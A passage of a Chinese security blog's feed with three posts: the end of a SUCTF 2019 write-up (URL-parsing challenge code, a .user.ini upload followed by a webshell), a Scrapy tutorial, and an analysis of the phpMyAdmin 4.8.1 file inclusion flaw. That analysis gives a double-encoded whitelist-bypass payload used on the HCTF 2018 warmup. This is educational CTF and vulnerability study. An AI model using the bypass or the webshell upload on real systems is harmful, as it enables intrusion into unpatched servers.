class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br><span class="line">    &lt;/code&gt;</span><br><span class="line">    &lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span><br><span class="line">    &lt;!-- Do you know the nginx? --&gt;</span><br></pre></td></tr></table></figure></p><p>这个题目似乎有一个姿势</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/suctf0.png" alt="黑帽大会的ppt"></p><p>urlparse函数</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">zz :: ~ » python</span><br><span class="line">Python <span class="number">3.5</span><span class="number">.4</span> (v3<span class="number">.5</span><span class="number">.4</span>:<span class="number">3</span>f56838, Aug  <span class="number">8</span> <span class="number">2017</span>, <span class="number">02</span>:<span class="number">17</span>:<span class="number">05</span>) [MSC v<span class="number">.1900</span> <span class="number">64</span> bit (AMD64)] on win32</span><br><span class="line">Type <span class="string">"help"</span>, <span class="string">"copyright"</span>, <span class="string">"credits"</span> <span class="keyword">or</span> <span class="string">"license"</span> <span class="keyword">for</span> more information.</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>r = <span class="string">"https://prontosil.club"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse_result = urlparse(r)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse_result</span><br><span class="line">ParseResult(scheme=<span class="string">'https'</span>, netloc=<span class="string">'prontosil.club'</span>, path=<span class="string">''</span>, params=<span class="string">''</span>, query=<span class="string">''</span>, fragment=<span class="string">''</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>urlparse_result.hostname</span><br><span class="line"><span class="string">'prontosil.club'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure></p><h2>checkin</h2><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/suctf1.png" alt=""></p><p>自己在nginx环境下进行了测试，成功地用了<code>.user.ini</code>复现了这个(开始的时候总是失败也是很迷了，似乎不能在index.php下进行测试)</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/suctf2.png" alt=""></p><p>上传一个<code>.user.ini</code><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/suctf3.png" alt=""></p><p>然后上传一个马</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/suctf4.png" alt=""></p><p>然后直接访问就行了</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/suctf5.png" alt=""></p><p>orz服了</p><h2>参考</h2><p><a href="https://www.xmsec.cc/suctf19-wp/" target="_blank" rel="noopener">SUCTF 2019 web partial wp</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;easy_sql&lt;/h2&gt;
&lt;p&gt;应该是非预期解，输入abs(1)就有flag&lt;/p&gt;
&lt;p&gt;不过也可以这样&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sql6
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="wp" scheme="https://prontosil.club/tags/wp/"/>
    
      <category term="suctf" scheme="https://prontosil.club/tags/suctf/"/>
    
  </entry>
  
  <entry>
    <title>scrapy爬虫入门</title>
    <link href="https://prontosil.club/2019/08/19/scrapy-pa-chong-ru-men/"/>
    <id>https://prontosil.club/2019/08/19/scrapy-pa-chong-ru-men/</id>
    <published>2019-08-19T11:10:37.000Z</published>
    <updated>2019-08-20T07:28:31.813Z</updated>
    
    <content type="html"><![CDATA[<h2>scrapy架构</h2><p>如图</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sccrapy0.png" alt="scrapy"></p><p>最中间的是scarpy的引擎，引擎指挥Spiders去爬取URL，spiders将requests发往调度器，调度器会针对这些请求进行排队，之后送往dowanloader，downloader会从internet上下载资源，将这些response发往spiders，spiders将其封装好送往item pipeline中</p><p>一个spider的工作流程大概就是如上所述</p><p>scrapy可以开启一个shell进行调试</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(base) C:\Users\zz&gt;scrapy shell https://www.anquanke.com</span><br><span class="line">2019-08-19 19:18:54 [scrapy.utils.log] INFO: Scrapy 1.7.3 started (bot: scrapybot)</span><br><span class="line">2019-08-19 19:18:54 [scrapy.utils.log] INFO: Versions: lxml 4.3.2.0, libxml2 2.9.9, cssselect 1.1.0, parsel 1.5.2, w3lib 1.21.0, Twisted 19.7.0, Python 3.7.3 (default, Mar 27 2019, 17:13:21) [MSC v.1915 64 bit (AMD64)], pyOpenSSL 19.0.0 (OpenSSL 1.1.1b  26 Feb 2019), cryptography 2.6.1, Platform Windows-10-10.0.18362-SP0</span><br><span class="line">2019-08-19 19:18:54 [scrapy.crawler] INFO: Overridden settings: &#123;&apos;DUPEFILTER_CLASS&apos;: &apos;scra</span><br><span class="line"></span><br><span class="line">....</span><br></pre></td></tr></table></figure></p><p>此时会得到一些对象</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">[s] Available Scrapy objects:</span><br><span class="line">[s]   scrapy     scrapy module (contains scrapy.Request, scrapy.Selector, etc)</span><br><span class="line">[s]   crawler    &lt;scrapy.crawler.Crawler object at 0x00000269894A07B8&gt;</span><br><span class="line">[s]   item       &#123;&#125;</span><br><span class="line">[s]   request    &lt;GET https://www.anquanke.com&gt;</span><br><span class="line">[s]   response   &lt;200 https://www.anquanke.com&gt;</span><br><span class="line">[s]   settings   &lt;scrapy.settings.Settings object at 0x00000269894A0AC8&gt;</span><br><span class="line">[s]   spider     &lt;DefaultSpider &apos;default&apos; at 0x269897d5160&gt;</span><br><span class="line">[s] Useful shortcuts:</span><br><span class="line">[s]   fetch(url[, redirect=True]) Fetch URL and update local objects (by default, redirects are followed)</span><br><span class="line">[s]   fetch(req)                  Fetch a scrapy.Request and update local objects</span><br><span class="line">[s]   shelp()           Shell help (print this help)</span><br><span class="line">[s]   view(response)    View response in a browser</span><br></pre></td></tr></table></figure></p><p>此时可以针对我们的xpath进行调试</p><p>xpath如何获得？我们可以自己手动编写，或者直接通过chrome的开发者工具获得</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/scrapy0.png" alt="获取xpath"></p><p>然后尝试一下对不对</p><p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [2]: response.xpath(&apos;//*[@id=&quot;post-list&quot;]/div[1]/div[2]/div[2]/div/div[1]/a&apos;)</span><br><span class="line">Out[2]: [&lt;Selector xpath=&apos;//*[@id=&quot;post-list&quot;]/div[1]/div[2]/div[2]/div/div[1]/a&apos; data=&apos;&lt;a target=&quot;_blank&quot; rel=&quot;noopener nore...&apos;&gt;]</span><br><span class="line"></span><br><span class="line">In [3]: response.xpath(&apos;//*[@id=&quot;post-list&quot;]/div[1]/div[2]/div[2]/div/div[1]/a/text()&apos;).extract()</span><br><span class="line">Out[3]: [&apos; 正在直播 | ISC 2019 互联网安全大会&apos;]</span><br></pre></td></tr></table></figure></p><p>这样就能爬取下来了</p><h2>一个简单的爬虫</h2><p>我们看一下官方提供的一个<a href="https://github.com/scrapy/dirbot" target="_blank" rel="noopener">栗子</a></p><p>目录结构如下：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/scrapy1.png" alt="目录结构"></p><p>在items.py文件中：</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.item <span class="keyword">import</span> Item, Field</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Website</span><span class="params">(Item)</span>:</span></span><br><span class="line"></span><br><span class="line">    name = Field()</span><br><span class="line">    description = Field()</span><br><span class="line">    url = Field()</span><br></pre></td></tr></table></figure></p><p>这里定义了我们需要爬取的items，稍后我们将在我们的spider中编写xpath规则来提取我们需要的数据</p><p>在dmoz.py中(爬虫的名字叫dmoz，名字必须唯一)</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> scrapy.spiders <span class="keyword">import</span> Spider</span><br><span class="line"><span class="keyword">from</span> scrapy.selector <span class="keyword">import</span> Selector</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> dirbot.items <span class="keyword">import</span> Website   <span class="comment"># ---&gt; 导入了我们之前定义的items</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DmozSpider</span><span class="params">(Spider)</span>:</span></span><br><span class="line">    name = <span class="string">"dmoz"</span></span><br><span class="line">    allowed_domains = [<span class="string">"dmoz.org"</span>]</span><br><span class="line">    start_urls = [</span><br><span class="line">        <span class="string">"http://www.dmoz.org/Computers/Programming/Languages/Python/Books/"</span>,</span><br><span class="line">        <span class="string">"http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/"</span>,</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(self, response)</span>:</span>  <span class="comment"># spider默认的回调函数</span></span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">        The lines below is a spider contract. For more info see:</span></span><br><span class="line"><span class="string">        http://doc.scrapy.org/en/latest/topics/contracts.html</span></span><br><span class="line"><span class="string">        @url http://www.dmoz.org/Computers/Programming/Languages/Python/Resources/</span></span><br><span class="line"><span class="string">        @scrapes name</span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line">        sites = response.css(<span class="string">'#site-list-content &gt; div.site-item &gt; div.title-and-desc'</span>)</span><br><span class="line">        items = []</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">解析数据</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">        <span class="keyword">for</span> site <span class="keyword">in</span> sites:</span><br><span class="line">            item = Website()</span><br><span class="line">            item[<span class="string">'name'</span>] = site.css(</span><br><span class="line">                <span class="string">'a &gt; div.site-title::text'</span>).extract_first().strip()</span><br><span class="line">            item[<span class="string">'url'</span>] = site.xpath(</span><br><span class="line">                <span class="string">'a/@href'</span>).extract_first().strip()</span><br><span class="line">            item[<span class="string">'description'</span>] = site.css(</span><br><span class="line">                <span class="string">'div.site-descr::text'</span>).extract_first().strip()</span><br><span class="line">            items.append(item)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> items</span><br></pre></td></tr></table></figure></p><p>可以看到这就是一个简单的，可以运行的爬虫了</p><p>当然还有后续的步骤，包括如何爬取更多的数据，如何换页，如何将数据存入数据库中等等</p><h2>参考</h2><p><a href="https://www.w3.org/TR/xpath/all/" target="_blank" rel="noopener">xpath学习</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2&gt;scrapy架构&lt;/h2&gt;
&lt;p&gt;如图&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/xinyongpeng/gitpic/master/sccrapy0.png&quot; alt=&quot;scrapy&quot;&gt;&lt;/p&gt;
&lt;p&gt;最中间的
      
    
    </summary>
    
      <category term="note" scheme="https://prontosil.club/categories/note/"/>
    
    
      <category term="scrapy" scheme="https://prontosil.club/tags/scrapy/"/>
    
  </entry>
  
  <entry>
    <title>phpmyadmin远程文件包含漏洞</title>
    <link href="https://prontosil.club/2019/08/19/phpmyadmin-yuan-cheng-wen-jian-bao-han-lou-dong/"/>
    <id>https://prontosil.club/2019/08/19/phpmyadmin-yuan-cheng-wen-jian-bao-han-lou-dong/</id>
    <published>2019-08-19T09:13:48.000Z</published>
    <updated>2019-08-20T14:49:33.461Z</updated>
    
    <content type="html"><![CDATA[<p>phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上</p><p>这个本地文件包含的漏洞确实挺巧妙地，分析一下：</p><h2>漏洞利用分析</h2><p>在GitHub上找了一下phpmyadmin的源码，不过话说我还不知带phpmyadmin怎么安装，之后研究一下</p><p><a href="https://github.com/phpmyadmin/phpmyadmin/blob/81fb6f75621ee2004c9406abdfb5f72de318af33/index.php#L55" target="_blank" rel="noopener">index.php</a></p><p>看到这串代码if判断很多，主要是最后一个判断</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">'/^index/'</span>, $_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">'target'</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">'target'</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">'target'</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>注意<code>preg_match('/^index/', $_REQUEST['target'])</code>是判断是不是以index开头，如果是就返回true，但是由于<code>!</code>所以就不能以index开头，类似这种判断不要被绕晕了</p><p><code>Core::checkPageValidity</code>检查，问题就出在这，方法定义在<a href="https://github.com/phpmyadmin/phpmyadmin/blob/81fb6f75621ee2004c9406abdfb5f72de318af33/libraries/classes/Core.php#L443" target="_blank" rel="noopener">443行</a></p><p>黑名单如下<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">'import.php'</span>, <span class="string">'export.php'</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure></p><p>方法具体如下：<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span><span class="params">(&amp;$page, array $whitelist = [])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="keyword">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>如果我们两个词URL编码。即<code>%253f</code> 浏览器传送之后变成<code>%3f</code>此时前两次if都不会进去，最后一次先<code>urldecode</code>，那么就变成了<code>?</code> 这时候是可以绕过的。</p><p>之所以要两次编码，直接用一个&quot;?&quot;不也可以绕过吗。</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/php0.png" alt=""></p><p>会导致这样的问题不能包含成功，具体为什么我也不是很清楚</p><h2>hctf2018</h2><p>这篇<a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">文章</a>已经讲的很详细了，这里写一下hctf2018的一道热身题，当时都还没仔细想过是一个已经存在的CVE</p><p>题目源码：</p><p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span><span class="params">(&amp;$page)</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">"source"</span>=&gt;<span class="string">"source.php"</span>,<span class="string">"hint"</span>=&gt;<span class="string">"hint.php"</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">'?'</span>, <span class="string">'?'</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"you can't see it"</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">'file'</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">'file'</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"&lt;br&gt;&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" /&gt;"</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p><p>题目要绕过不算难，但是有一个地方很重要</p><p>这是我在本地调试的目录：</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf0.png" alt=""></p><p>调试的时候我使用了如下payload</p><p><code>http://localhost/audit/warmup.php?file=source.php%253f/../flag.php</code></p><p>此时能够成功绕过</p><p><img src="https://raw.githubusercontent.com/xinyongpeng/gitpic/master/hctf1.png" alt=""></p><p>就在这种情况下，文件包含也是成功的！</p><p>根据题目提示flag在某个位置，其实这里靠猜了，因为只能用<code>../</code>这样的来回到上一级目录</p><h2>参考</h2><p><a href="https://www.jianshu.com/p/0d75017c154f" target="_blank" rel="noopener">phpmyadmin4.8.1远程文件包含漏洞</a><a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="noopener">phpmyadmin4.8.1后台getshell</a></p><p><a href="https://blog.vulnspy.com/2018/06/21/phpMyAdmin-4-8-x-LFI-Exploit/" target="_blank" rel="noopener">phpMyAdmin 4.8.x 本地文件包含漏洞利用</a></p><p>突然还发现一个可以复现很多漏洞的地方 https://www.vulnspy.com/phpmyadmin-4.8.1/</p><p>github地址： https://github.com/vulnspy/phpmyadmin-4.8.1</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;phpmyadmin 这个漏洞可以说是由于太过细心而导致的，这也证实了安全永远在路上&lt;/p&gt;
&lt;p&gt;这个本地文件包含的漏洞确实挺巧妙地，分析一下：&lt;/p&gt;
&lt;h2&gt;漏洞利用分析&lt;/h2&gt;
&lt;p&gt;在GitHub上找了一下phpmyadmin的源码，不过话说我还不知带phpmy
      
    
    </summary>
    
      <category term="ctf" scheme="https://prontosil.club/categories/ctf/"/>
    
    
      <category term="php" scheme="https://prontosil.club/tags/php/"/>
    
      <category term="LFI" scheme="https://prontosil.club/tags/LFI/"/>
    
  </entry>
  
</feed>
